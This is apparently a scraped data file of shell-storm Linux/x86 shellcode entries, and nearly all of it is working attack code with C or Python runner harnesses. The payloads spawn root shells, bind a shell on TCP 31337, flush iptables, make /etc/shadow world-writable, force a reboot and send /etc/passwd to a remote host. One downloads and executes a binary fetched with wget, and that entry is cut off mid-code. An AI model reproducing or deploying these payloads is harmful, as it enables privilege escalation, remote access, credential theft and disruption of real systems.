{"Title": "Linux/x86 - mkdir(hacked) + exit() Shellcode (36 bytes)", "Author": "zillion", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-542.php", "View": null, "code": ["The comment in that file is not correct.. I cut and pasted the shell code", "in an existing c source and forgot to adjust it..", "", "/*", " * This shellcode will do a mkdir() of 'hacked' and then an exit()", " * Written by zillion@safemode.org", " *", " */", "", "char shellcode[]=", "        \"\\xeb\\x16\\x5e\\x31\\xc0\\x88\\x46\\x06\\xb0\\x27\\x8d\\x1e\\x66\\xb9\\xed\"", "        \"\\x01\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x68\"", "        \"\\x61\\x63\\x6b\\x65\\x64\\x23\";", "", "", "void main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - setreuid() + /sbin/iptables -F + exit(0) Shellcode (76 bytes)", "Author": "Sh3llc0d3", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-805.php", "View": null, "code": ["/* ", " *\tAuthor: Sh3llc0d3", " *\tEnvironment: Linux/x86", " *\tDeveloped from: GNU ASM (AT&T Syntax)", " *\tPurpose: [setreuid()] -> [/sbin/iptables -F] -> [exit(0)]", " *\tSize: 76 bytes", " *", " *\tWebsite:\troot-exploit.com", " */", "char code[] =\t\"\\xeb\\x33\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x5e\\x31\\xc0\\x88\\x46\"", "\t\t\"\\x0e\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\\x5e\\x0f\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\"", "\t\t\"\\x0b\\x89\\xf3\\x8d\\x4e\\x12\\x8d\\x56\\x1a\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\"", "\t\t\"\\xcd\\x80\\xe8\\xc8\\xff\\xff\\xff\\x2f\\x73\\x62\\x69\\x6e\\x2f\\x69\\x70\\x74\\x61\"", "\t\t\"\\x62\\x6c\\x65\\x73\\x23\\x2d\\x46\\x23\";", "", "int main(int argc, char **argv)", "{", "\tint (*func)();", "\tfunc = (int (*)()) code;", "\t(int)(*func)();", "}"]},
{"Title": "Linux/x86 - setreuid(0,0) + execve(/bin/ash,NULL,NULL) + XOR Encoded Shellcode (58 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-807.php", "View": null, "code": ["# Title: Linux x86 setreuid (0,0) & execve(\"/bin/ash\",NULL,NULL) + XOR encoded - 58 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono ", "", "from ctypes import *", "", "shell = \"\\xeb\\x0d\\x5e\\x31\\xc9\\xb1\\x26\\x80\\x36\\x19\\x46\\xe2\\xfa\\xeb\\x05\\xe8\\xee\\xff\\xff\\xff\\x28\\xd9\\x28\\xc2\\x28\\xd0\\x28\\xcb\\xa9\\x5f\\x28\\xc2\\x28\\xd0\\xd4\\x99\\xa9\\x12\\x4a\\x71\\x36\\x78\\x6a\\x71\\x71\\x36\\x7b\\x70\\x77\\x90\\xfa\\x28\\xd0\\x28\\xd0\\x4a\\xd4\\x99\"", "", "memory = create_string_buffer(shell, len(shell))", "", "shellcode = cast(memory, CFUNCTYPE(c_void_p))", "", "shellcode()"]},
{"Title": "Linux/x86 - setreuid(0,0) + execve(\"/bin/csh\", [/bin/csh, NULL]) + XOR Encoded Shellcode (53 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-808.php", "View": null, "code": ["# Title: Linux x86 setreuid (0,0) & execve(\"/bin/csh\", [\"/bin/csh\", NULL]) + XOR encoded - 53 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono", "", "from ctypes import *", "", "shell = \"\\xeb\\x0d\\x5e\\x31\\xc9\\xb1\\x21\\x80\\x36\\x7c\\x46\\xe2\\xfa\\xeb\\x05\\xe8\\xee\\xff\\xff\\xff\\x16\\x3a\\x24\\x4d\\xa7\\x4d\\xb5\\xb1\\xfc\\x4d\\xae\\x16\\x77\\x24\\x2e\\x14\\x53\\x1f\\x0f\\x14\\x14\\x53\\x1e\\x15\\x12\\xf5\\x9f\\x2e\\x2f\\xf5\\x9d\\xb1\\xfc\"", "", "memory = create_string_buffer(shell, len(shell))", "", "shellcode = cast(memory, CFUNCTYPE(c_void_p))", "", "shellcode()"]},
{"Title": "Linux/x86 - setreuid(0,0) + execve(\"/bin/ksh\", [/bin/ksh, NULL]) + XOR Encoded Shellcode (53 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-809.php", "View": null, "code": ["# Title: Linux x86 setreuid (0,0) & execve(\"/bin/ksh\", [\"/bin/ksh\", NULL]) + XOR encoded - 53 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono", "", "from ctypes import *", "", "shell = \"\\xeb\\x0d\\x5e\\x31\\xc9\\xb1\\x21\\x80\\x36\\x7c\\x46\\xe2\\xfa\\xeb\\x05\\xe8\\xee\\xff\\xff\\xff\\x16\\x3a\\x24\\x4d\\xa7\\x4d\\xb5\\xb1\\xfc\\x4d\\xae\\x16\\x77\\x24\\x2e\\x14\\x53\\x17\\x0f\\x14\\x14\\x53\\x1e\\x15\\x12\\xf5\\x9f\\x2e\\x2f\\xf5\\x9d\\xb1\\xfc\"", "", "memory = create_string_buffer(shell, len(shell))", "", "shellcode = cast(memory, CFUNCTYPE(c_void_p))", "", "shellcode()"]},
{"Title": "Linux/x86 - setreuid(0,0) + execve(\"/bin/zsh\", [/bin/zsh, NULL]) + XOR Encoded Shellcode (53 bytes)", "Author": "egeektronic", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-810.php", "View": null, "code": ["# Title: Linux x86 setreuid (0,0) & execve(\"/bin/zsh\", [\"/bin/zsh\", NULL]) + XOR encoded - 53 bytes", "# Author: egeektronic <info (at) egeektronic {dot} com>", "# Twitter: @egeektronic", "# Tested on: Slackware 13.37", "# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono", "", "from ctypes import *", "", "shell = \"\\xeb\\x0d\\x5e\\x31\\xc9\\xb1\\x21\\x80\\x36\\x35\\x46\\xe2\\xfa\\xeb\\x05\\xe8\\xee\\xff\\xff\\xff\\x5f\\x73\\x6d\\x04\\xee\\x04\\xfc\\xf8\\xb5\\x04\\xe7\\x5f\\x3e\\x6d\\x67\\x5d\\x1a\\x4f\\x46\\x5d\\x5d\\x1a\\x57\\x5c\\x5b\\xbc\\xd6\\x67\\x66\\xbc\\xd4\\xf8\\xb5\"", "", "memory = create_string_buffer(shell, len(shell))", "", "shellcode = cast(memory, CFUNCTYPE(c_void_p))", "", "shellcode()"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (28 bytes)", "Author": "Jean Pascal Pereira", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-811.php", "View": null, "code": ["/*", "Title:\tLinux x86 execve(\"/bin/sh\") - 28 bytes", "Author:\tJean Pascal Pereira <pereira@secbiz.de>", "Web:\thttp://0xffe4.org", "", "", "Disassembly of section .text:", "", "08048060 <_start>:", " 8048060: 31 c0                 xor    %eax,%eax", " 8048062: 50                    push   %eax", " 8048063: 68 2f 2f 73 68        push   $0x68732f2f", " 8048068: 68 2f 62 69 6e        push   $0x6e69622f", " 804806d: 89 e3                 mov    %esp,%ebx", " 804806f: 89 c1                 mov    %eax,%ecx", " 8048071: 89 c2                 mov    %eax,%edx", " 8048073: b0 0b                 mov    $0xb,%al", " 8048075: cd 80                 int    $0x80", " 8048077: 31 c0                 xor    %eax,%eax", " 8048079: 40                    inc    %eax", " 804807a: cd 80                 int    $0x80", "", "", "", "*/", "", "#include <stdio.h>", "", "char shellcode[] = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"", "                   \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"", "                   \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"", "                   \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";", "", "int main()", "{", "  fprintf(stdout,\"Lenght: %d\\n\",strlen(shellcode));", "  (*(void  (*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - Stager Reads Second Stage From STDIN Shellcode (14 bytes)", "Author": "_fkz", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-824.php", "View": null, "code": ["/*", " * (linux/x86) stagger that reads second stage shellcode (127 bytes maximum) from stdin - 14 bytes", " * _fkz / twitter: @_fkz ", " *", " * sc = \"\\x6A\\x7F\\x5A\\x54\\x59\\x31\\xDB\\x6A\\x03\\x58\\xCD\\x80\\x51\\xC3\"", " * ", " * Example of use:", " * (echo -ne \"\\xseconde stage shellcode\\x\"; cat) | ./stager", " */", " ", " char shellcode[] = ", " ", " \t\t\"\\x6A\\x7F\"\t\t//\tpush\tbyte\t+0x7F", " \t\t\"\\x5A\"\t\t\t//\tpop\t\tedx\t", " \t\t\"\\x54\"\t\t\t//\tpush\tesp", " \t\t\"\\x59\"\t\t\t//\tpop\t\tesp", " \t\t\"\\x31\\xDB\"\t\t//\txor\t\tebx,ebx", " \t\t\"\\x6A\\x03\"\t\t//\tpush\tbyte\t+0x3", " \t\t\"\\x58\"\t\t\t//\tpop\t\teax", " \t\t\"\\xCD\\x80\"\t\t//\tint\t\t0x80", " \t\t\"\\x51\"\t\t\t//\tpush\tecx", " \t\t\"\\xC3\";\t\t\t//\tret", "", "int main(int argc, char *argv[])", "{", "\tvoid (*execsh)() = (void *)&shellcode;", "\texecsh();", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - iptables --flush Shellcode (43 bytes)", "Author": "Hamza Megahed", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-825.php", "View": null, "code": ["    *****************************************************", "    *    Linux/x86 iptables --flush 43 bytes \t        *", "    *****************************************************", "    *\t  \t  Author: Hamza Megahed\t\t        *", "    *****************************************************", "    *             Twitter: @Hamza_Mega                  *", "    *****************************************************", "    *     blog: hamza-mega[dot]blogspot[dot]com         *", "    *****************************************************", "    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *", "    *****************************************************", "", "xor    %eax,%eax", "push   %eax", "pushw  $0x462d", "movl   %esp,%esi", "pushl  %eax", "pushl  $0x73656c62", "pushl  $0x61747069", "pushl  $0x2f6e6962", "pushl  $0x732f2f2f", "mov    %esp,%ebx", "pushl  %eax", "pushl  %esi", "pushl  %ebx", "movl   %esp,%ecx", "mov    %eax,%edx", "mov    $0xb,%al", "int    $0x80", "", "********************************", "#include <stdio.h>", "#include <string.h>", " ", "char *shellcode = \"\\x31\\xc0\\x50\\x66\\x68\\x2d\\x46\\x89\\xe6\\x50\\x68\\x62\\x6c\\x65\\x73\"", "\t\t  \"\\x68\\x69\\x70\\x74\\x61\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\"", "\t\t  \"\\x73\\x89\\xe3\\x50\\x56\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\";", "", " ", "int main(void)", "{", "fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "(*(void(*)()) shellcode)();", "return 0;", "}"]}
]

const pag_8 = [{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (23 bytes) (2)", "Author": "Hamza Megahed", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-827.php", "View": null, "code": ["    *****************************************************", "    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *", "    *****************************************************", "    *\t  \t  Author: Hamza Megahed\t\t        *", "    *****************************************************", "    *             Twitter: @Hamza_Mega                  *", "    *****************************************************", "    *     blog: hamza-mega[dot]blogspot[dot]com         *", "    *****************************************************", "    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *", "    *****************************************************", "", "xor    %eax,%eax", "push   %eax", "push   $0x68732f2f", "push   $0x6e69622f", "mov    %esp,%ebx", "push   %eax", "push   %ebx", "mov    %esp,%ecx", "mov    $0xb,%al", "int    $0x80", "", "********************************", "#include <stdio.h>", "#include <string.h>", " ", "char *shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"", "\t\t  \"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "int main(void)", "{", "fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "(*(void(*)()) shellcode)();", "return 0;", "}"]},
{"Title": "Linux/x86 - execve(chmod 0777 /etc/shadow) Shellcode (57 bytes)", "Author": "Hamza Megahed", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-828.php", "View": null, "code": ["*****************************************************", "* Linux/x86 execve-chmod 0777 /etc/shadow  57 bytes *", "*****************************************************", "* Author: Hamza Megahed                             *", "*****************************************************", "* Twitter: @Hamza_Mega                              *", "*****************************************************", "* blog: hamza-mega[dot]blogspot[dot]com             *", "*****************************************************", "* E-mail: hamza[dot]megahed[at]gmail[dot]com        *", "*****************************************************", "", "xor    %eax,%eax", "push   %eax", "pushl  $0x776f6461", "pushl  $0x68732f2f", "pushl  $0x6374652f", "movl   %esp,%esi", "push   %eax", "pushl  $0x37373730", "movl   %esp,%ebp", "push   %eax", "pushl  $0x646f6d68", "pushl  $0x632f6e69", "pushl  $0x622f2f2f", "mov    %esp,%ebx", "pushl  %eax", "pushl  %esi", "pushl  %ebp", "pushl  %ebx", "movl   %esp,%ecx", "mov    %eax,%edx", "mov    $0xb,%al", "int    $0x80", "", "********************************", "#include <stdio.h>", "#include <string.h>", " ", "char *shellcode = ", "\"\\x31\\xc0\\x50\\x68\\x61\\x64\\x6f\\x77\\x68\\x2f\\x2f\\x73\"", "\"\\x68\\x68\\x2f\\x65\\x74\\x63\\x89\\xe6\\x50\\x68\\x30\\x37\"", "\"\\x37\\x37\\x89\\xe5\\x50\\x68\\x68\\x6d\\x6f\\x64\\x68\\x69\"", "\"\\x6e\\x2f\\x63\\x66\\x68\\x2f\\x62\\x89\\xe3\\x50\\x56\\x55\"", "\"\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80;\";", "", "", "", " ", "int main(void)", "{", "fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "(*(void(*)()) shellcode)();", "return 0;", "}"]},
{"Title": "Linux/x86 - Force Reboot Shellcode (36 bytes)", "Author": "Hamza Megahed", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-831.php", "View": null, "code": ["**********************************************", "* Linux/x86 Force Reboot shellcode 36 bytes  *", "**********************************************", "* Author: Hamza Megahed                      *", "**********************************************", "* Twitter: @Hamza_Mega                       *", "**********************************************", "* blog: hamza-mega[dot]blogspot[dot]com      *", "**********************************************", "* E-mail: hamza[dot]megahed[at]gmail[dot]com *", "**********************************************", "", "xor    %eax,%eax", "push   %eax", "push   $0x746f6f62", "push   $0x65722f6e", "push   $0x6962732f", "mov    %esp,%ebx", "push   %eax", "pushw  $0x662d", "mov    %esp,%esi", "push   %eax", "push   %esi", "push   %ebx", "mov    %esp,%ecx", "mov    $0xb,%al", "int    $0x80", "", "**********************************************", "", "#include <stdio.h>", "#include <string.h>", " ", "char *shellcode = \"\\x31\\xc0\\x50\\x68\\x62\\x6f\\x6f\\x74\\x68\\x6e\"", "                  \"\\x2f\\x72\\x65\\x68\\x2f\\x73\\x62\\x69\\x89\\xe3\"", "                  \"\\x50\\x66\\x68\\x2d\\x66\\x89\\xe6\\x50\\x56\\x53\"", "                  \"\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "int main(void)", "{", "fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "(*(void(*)()) shellcode)();", "return 0;", "}"]},
{"Title": "Linux/x86 - Bind (31337/TCP) Shell Shellcode (108 bytes)", "Author": "Russell Willis", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-847.php", "View": null, "code": ["/*", "", "Title   : tcpbindshell  (108 bytes)", "Date    : 15 May 2013", "Author  : Russell Willis <codinguy@gmail.com>", "Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)", "", "$ objdump -D tcpbindshell -M intel", "", "tcpbindshell:     file format elf32-i386", "", "Disassembly of section .text:", "", "08048060 <_start>:", " 8048060:   31 c0                   xor    eax,eax", " 8048062:   31 db                   xor    ebx,ebx", " 8048064:   31 c9                   xor    ecx,ecx", " 8048066:   31 d2                   xor    edx,edx", " 8048068:   b0 66                   mov    al,0x66", " 804806a:   b3 01                   mov    bl,0x1", " 804806c:   51                      push   ecx", " 804806d:   6a 06                   push   0x6", " 804806f:   6a 01                   push   0x1", " 8048071:   6a 02                   push   0x2", " 8048073:   89 e1                   mov    ecx,esp", " 8048075:   cd 80                   int    0x80", " 8048077:   89 c6                   mov    esi,eax", " 8048079:   b0 66                   mov    al,0x66", " 804807b:   b3 02                   mov    bl,0x2", " 804807d:   52                      push   edx", " 804807e:   66 68 7a 69             pushw  0x697a", " 8048082:   66 53                   push   bx", " 8048084:   89 e1                   mov    ecx,esp", " 8048086:   6a 10                   push   0x10", " 8048088:   51                      push   ecx", " 8048089:   56                      push   esi", " 804808a:   89 e1                   mov    ecx,esp", " 804808c:   cd 80                   int    0x80", " 804808e:   b0 66                   mov    al,0x66", " 8048090:   b3 04                   mov    bl,0x4", " 8048092:   6a 01                   push   0x1", " 8048094:   56                      push   esi", " 8048095:   89 e1                   mov    ecx,esp", " 8048097:   cd 80                   int    0x80", " 8048099:   b0 66                   mov    al,0x66", " 804809b:   b3 05                   mov    bl,0x5", " 804809d:   52                      push   edx", " 804809e:   52                      push   edx", " 804809f:   56                      push   esi", " 80480a0:   89 e1                   mov    ecx,esp", " 80480a2:   cd 80                   int    0x80", " 80480a4:   89 c3                   mov    ebx,eax", " 80480a6:   31 c9                   xor    ecx,ecx", " 80480a8:   b1 03                   mov    cl,0x3", "080480aa <dupfd>:", " 80480aa:   fe c9                   dec    cl", " 80480ac:   b0 3f                   mov    al,0x3f", " 80480ae:   cd 80                   int    0x80", " 80480b0:   75 f8                   jne    80480aa ", " 80480b2:   31 c0                   xor    eax,eax", " 80480b4:   52                      push   edx", " 80480b5:   68 6e 2f 73 68          push   0x68732f6e", " 80480ba:   68 2f 2f 62 69          push   0x69622f2f", " 80480bf:   89 e3                   mov    ebx,esp", " 80480c1:   52                      push   edx", " 80480c2:   53                      push   ebx", " 80480c3:   89 e1                   mov    ecx,esp", " 80480c5:   52                      push   edx", " 80480c6:   89 e2                   mov    edx,esp", " 80480c8:   b0 0b                   mov    al,0xb", " 80480ca:   cd 80                   int    0x80", "*/", "", "#include <stdio.h>", "", "/* ", " Port High/Low bytes", " Current port 31337 (7a69)", "*/", "#define PORTHL \"\\x7a\\x69\"", "", "unsigned char code[] = ", "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\"", "\"\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\"", "\"\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\"", "\"\\x66\\x68\"PORTHL\"\\x66\\x53\\x89\\xe1\\x6a\\x10\"", "\"\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\"", "\"\\x6a\\x01\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\"", "\"\\x05\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\"", "\"\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\\x80\"", "\"\\x75\\xf8\\x31\\xc0\\x52\\x68\\x6e\\x2f\\x73\\x68\"", "\"\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\"", "\"\\xe1\\x52\\x89\\xe2\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "    printf(\"Shellcode Length: %d\\n\", sizeof(code)-1);", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/x86 - /proc/sys/net/ipv4/ip_forward 0 + exit() Shellcode (83 bytes)", "Author": "Hamid Zamani", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-848.php", "View": null, "code": ["/*", "    In The Name of G0D", "    ", "    Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() ", "    Size : 83 Bytes", "    ", "    fun for routers ;)", "    ", "    Author : By Hamid Zamani (aka HAMIDx9)", "    Member of ^^Ashiyane Digital Security Team^^", "    ", "", "Disassembly of section .text:", "", "08048054 <_start>:", " 8048054:   31 c0                   xor    %eax,%eax", " 8048056:   50                      push   %eax", " 8048057:   68 77 61 72 64          push   $0x64726177", " 804805c:   68 5f 66 6f 72          push   $0x726f665f", " 8048061:   68 34 2f 69 70          push   $0x70692f34", " 8048066:   68 2f 69 70 76          push   $0x7670692f", " 804806b:   68 2f 6e 65 74          push   $0x74656e2f", " 8048070:   68 73 79 73 2f          push   $0x2f737973", " 8048075:   68 72 6f 63 2f          push   $0x2f636f72", " 804807a:   66 68 2f 70             pushw  $0x702f", " 804807e:   89 e3                   mov    %esp,%ebx", " 8048080:   31 c9                   xor    %ecx,%ecx", " 8048082:   b1 01                   mov    $0x1,%cl", " 8048084:   b0 05                   mov    $0x5,%al", " 8048086:   cd 80                   int    $0x80", " 8048088:   89 c3                   mov    %eax,%ebx", " 804808a:   31 c9                   xor    %ecx,%ecx", " 804808c:   51                      push   %ecx", " 804808d:   6a 30                   push   $0x30", " 804808f:   89 e1                   mov    %esp,%ecx", " 8048091:   31 d2                   xor    %edx,%edx", " 8048093:   b2 01                   mov    $0x1,%dl", " 8048095:   b0 04                   mov    $0x4,%al", " 8048097:   cd 80                   int    $0x80", " 8048099:   31 c0                   xor    %eax,%eax", " 804809b:   83 c0 06                add    $0x6,%eax", " 804809e:   cd 80                   int    $0x80", " 80480a0:   31 c0                   xor    %eax,%eax", " 80480a2:   40                      inc    %eax", " 80480a3:   31 db                   xor    %ebx,%ebx", " 80480a5:   cd 80                   int    $0x80", "*/", "", "#include <stdio.h>", "", "int main(int argc,char **argv)", "{", "", "char shellcode[] = \"\\x31\\xc0\\x50\\x68\\x77\\x61\\x72\\x64\\x68\"", "                   \"\\x5f\\x66\\x6f\\x72\\x68\\x34\\x2f\\x69\\x70\"", "                   \"\\x68\\x2f\\x69\\x70\\x76\\x68\\x2f\\x6e\\x65\"", "                   \"\\x74\\x68\\x73\\x79\\x73\\x2f\\x68\\x72\\x6f\"", "                   \"\\x63\\x2f\\x66\\x68\\x2f\\x70\\x89\\xe3\\x31\"", "                   \"\\xc9\\xb1\\x01\\xb0\\x05\\xcd\\x80\\x89\\xc3\"", "                   \"\\x31\\xc9\\x51\\x6a\\x30\\x89\\xe1\\x31\\xd2\"", "                   \"\\xb2\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\x83\"", "                   \"\\xc0\\x06\\xcd\\x80\\x31\\xc0\\x40\\x31\\xdb\"", "                   \"\\xcd\\x80\";", "                   ", "     printf(\"Length: %d\\n\",strlen(shellcode));", "     (*(void(*)()) shellcode)();", "     ", "     return 0;", "}"]},
{"Title": "Linux/x86 - Reverse (127.1.1.1:12345/TCP) cat /etc/passwd Shellcode (111 bytes)", "Author": "Daniel Sauder", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-861.php", "View": null, "code": ["/*", "; Author: Daniel Sauder", "; Website: http://govolution.wordpress.com/about", "; License http://creativecommons.org/licenses/by-sa/3.0/", "", "; Shellcode reads /etc/passwd and sends the content to 127.1.1.1 port 12345. ", "; The file can be recieved using netcat:", "; $ nc -l 127.1.1.1 12345", "", "section .text", "", "global _start", "", "_start:", "    ; socket", "    push BYTE 0x66    ; socketcall 102", "    pop eax", "    xor ebx, ebx ", "    inc ebx ", "    xor edx, edx", "    push edx ", "    push BYTE 0x1", "    push BYTE 0x2", "    mov ecx, esp", "    int 0x80", "    mov esi, eax", "", "    ; connect", "    push BYTE 0x66 ", "    pop eax", "    inc ebx", "    push DWORD 0x0101017f  ;127.1.1.1", "    push WORD 0x3930  ; Port 12345", "    push WORD bx", "    mov ecx, esp", "    push BYTE 16", "    push ecx", "    push esi", "    mov ecx, esp", "    inc ebx", "    int 0x80", "", "    ; dup2", "    mov esi, eax", "    push BYTE 0x1", "    pop ecx", "    mov BYTE al, 0x3F", "    int 0x80", "    ", "    ;read the file", "    jmp short call_shellcode", "    ", "shellcode:", "    push 0x5", "    pop eax", "    pop ebx", "    xor ecx,ecx", "    int 0x80", "    mov ebx,eax", "    mov al,0x3", "    mov edi,esp", "    mov ecx,edi", "    xor edx,edx", "    mov dh,0xff", "    mov dl,0xff", "    int 0x80", "    mov edx,eax", "    push 0x4", "    pop eax", "    mov bl, 0x1", "    int 0x80", "    push 0x1", "    pop eax", "    inc ebx", "    int 0x80", "    ", "call_shellcode:", "    call shellcode", "    message db \"/etc/passwd\"", "    ", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "\"\\x6a\\x66\\x58\\x31\\xdb\\x43\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x66\\x58\\x43\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x30\\x39\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xcd\\x80\\x89\\xc6\\x6a\\x01\\x59\\xb0\\x3f\\xcd\\x80\\xeb\\x27\\x6a\\x05\\x58\\x5b\\x31\\xc9\\xcd\\x80\\x89\\xc3\\xb0\\x03\\x89\\xe7\\x89\\xf9\\x31\\xd2\\xb6\\xff\\xb2\\xff\\xcd\\x80\\x89\\xc2\\x6a\\x04\\x58\\xb3\\x01\\xcd\\x80\\x6a\\x01\\x58\\x43\\xcd\\x80\\xe8\\xd4\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\";", "", "main()", "{", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "    int (*ret)() = (int(*)())code;", "", "    ret();", "", "}"]},
{"Title": "Linux/x86 - Download File (http://192.168.2.222/x) + chmod() + execute Shellcode (108 bytes)", "Author": "Daniel Sauder", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-862.php", "View": null, "code": ["/*", "; Filename: downloadexec.nasm", "; Author: Daniel Sauder", "; Website: http://govolution.wordpress.com/", "; Tested on: Ubuntu 12.04 / 32Bit", "; License: http://creativecommons.org/licenses/by-sa/3.0/", "", "; Shellcode:", "; - download 192.168.2.222/x with wget", "; - chmod x", "; - execute x", "; - x is an executable", "; - length 108 bytes", "", "global _start", "", "section .text", "", "_start:", "", "    ;fork", "    xor eax,eax", "    mov al,0x2", "    int 0x80", "    xor ebx,ebx", "    cmp eax,ebx", "    jz child", "  ", "    ;wait(NULL)", "    xor eax,eax", "    mov al,0x7", "    int 0x80", "        ", "    ;chmod x", "    xor ecx,ecx", "    xor eax, eax", "    push eax", "    mov al, 0xf", "    push 0x78", "    mov ebx, esp", "    xor ecx, ecx", "    mov cx, 0x1ff", "    int 0x80", "    ", "    ;exec x", "    xor eax, eax", "    push eax", "    push 0x78", "    mov ebx, esp", "    push eax", "    mov edx, esp", "    push ebx", "    mov ecx, esp", "    mov al, 11", "    int 0x80", "    ", "child:", "    ;download 192.168.2.222//x with wget", "    push 0xb", "    pop eax", "    cdq", "    push edx", "    ", "    push 0x782f2f32 ;2//x avoid null byte", "    push 0x32322e32 ;22.2", "    push 0x2e383631 ;.861", "    push 0x2e323931 ;.291", "    mov ecx,esp", "    push edx", "    ", "    push 0x74 ;t", "    push 0x6567772f ;egw/", "    push 0x6e69622f ;nib/", "    push 0x7273752f ;rsu/", "    mov ebx,esp", "    push edx", "    push ecx", "    push ebx", "    mov ecx,esp", "    int 0x80", "    ", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", 